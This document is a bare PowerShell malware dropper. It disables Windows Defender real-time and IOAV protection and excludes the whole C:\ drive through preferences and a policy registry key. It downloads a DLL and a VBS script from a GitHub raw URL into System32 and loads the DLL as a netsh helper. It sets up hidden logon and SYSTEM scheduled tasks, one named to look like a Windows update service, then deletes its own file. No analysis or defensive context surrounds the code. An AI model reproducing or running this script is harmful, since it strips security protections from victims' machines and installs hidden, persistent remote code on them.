Set-MpPreference -DisableRealtimeMonitoring $trueSet-MpPreference -DisableIOAVProtection $trueAdd-MpPreference -ExclusionPath "C:\"New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Force | Out-Null; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\" -Value "" -PropertyType String -ForceInvoke-WebRequest -Uri "https://raw.githubusercontent.com/procatt182/gg/main/netshelper.dll" -OutFile "C:\Windows\System32\netshelper.dll"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/procatt182/gg/main/run.vbs" -OutFile "C:\Windows\System32\run.vbs"Start-Process -FilePath "netsh" -ArgumentList "add helper C:\Windows\System32\netshelper.dll" -WindowStyle Hidden -Wait$taskName = "WinUpdateSvc"$taskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Windows\System32\run.vbs"$taskTrigger = New-ScheduledTaskTrigger -AtLogOn$taskSettings = New-ScheduledTaskSettingsSet -HiddenRegister-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "New-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths'' -Name ''C:\'' -Value '''' -PropertyType String -Force -WindowStyle Hidden"'$trigger = New-ScheduledTaskTrigger -AtLogOn$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel HighestRegister-ScheduledTask -TaskName "AddDefenderGPOExclusion" -Action $action -Trigger $trigger -Principal $principal -Description "Add Defender GPO exclusion on startup"Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Start-Sleep -Seconds 2; Remove-Item -Path `"$env:USERPROFILE\Documents\run.ps1`" -Force -ErrorAction SilentlyContinue; Start-Process -WindowStyle Minimized -FilePath 'wscript.exe' -ArgumentList 'C:\Windows\System32\run.vbs'`""